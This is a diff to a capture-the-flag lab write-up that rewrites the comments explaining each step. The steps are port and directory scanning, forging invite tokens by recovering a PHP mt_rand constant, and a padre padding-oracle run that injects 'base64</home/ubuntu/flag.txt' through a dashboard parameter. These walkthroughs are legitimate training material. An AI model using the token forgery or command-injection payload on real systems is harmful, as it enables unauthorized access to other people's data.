@@ -41,12 +41,12 @@ Using the known `alpha@fake.thm` invite token, the constant value was brute-forc
 Tools: [nmap](../../tools/recon/nmap.md), [feroxbuster](../../tools/fuzz/feroxbuster.md), [curl](../../tools/web/curl.md).
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run a full port scan and service enumeration.
+# Why here: discover the Apache instance on port 1337 and map the entry point.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
 nmap -sVC -p22,1337 $TARGET -oN service
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: brute-force directories and files with Feroxbuster.
+# Why here: locate the /logs/ directory and identify sensitive files like app.log.
 feroxbuster -u http://$TARGET:1337 \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
   --dont-scan locale
@@ -61,11 +61,11 @@ http://$TARGET:1337/logs/app.log
 ```
 
 ```bash
-# What it does: decodes or encodes Base64 data.
-# Why here: convertir loot codificado en texto utilizable.
+# What it does: decode the Base64 invite code.
+# Why here: retrieve the numeric value used to brute-force the mt_rand constant.
 echo "MTM0ODMzNzEyMg==" | base64 -d
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: retrieve the obfuscated JavaScript file.
+# Why here: analyze the client-side code to extract the hidden API key.
 curl http://$TARGET:1337/js/api.js
 ```
 
@@ -90,24 +90,24 @@ alpha@fake.thm -> MTM0ODMzNzEyMg==
 Brute-force the constant:
 
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: run the constant recovery script.
+# Why here: identify the deterministic constant used in the PHP mt_rand seeding logic.
 php get_constant.php
 ```
 
 Generate a token for `hello@fake.thm`:
 
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: generate a valid invite token.
+# Why here: create a session-ready token for a targeted email address to bypass the invite wall.
 php get_token.php
 ```
 
 Login:
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target web server.
+# Why here: retrieve obfuscated JS files or authenticate with the generated tokens.
 curl -X POST http://$TARGET:1337/index.php \
   -d "invite_username=hello@fake.thm&invite_code=TOKEN_GENERATED" \
   -c cookies.txt -L
@@ -139,8 +139,8 @@ Avoid spaces when needed:
 padre -cookie 'PHPSESSID=...; role=...' \
   -u "http://$TARGET:1337/dashboard.php?date=$" \
   -enc 'base64</home/ubuntu/flag.txt'
-# What it does: decodes or encodes Base64 data.
-# Why here: convertir loot codificado en texto utilizable.
+# What it does: decode the Base64-encoded flag file content.
+# Why here: read the final flag after bypassing the dashboard command filtering.
 echo "OUTPUT_BASE64" | base64 -d
 ```
 
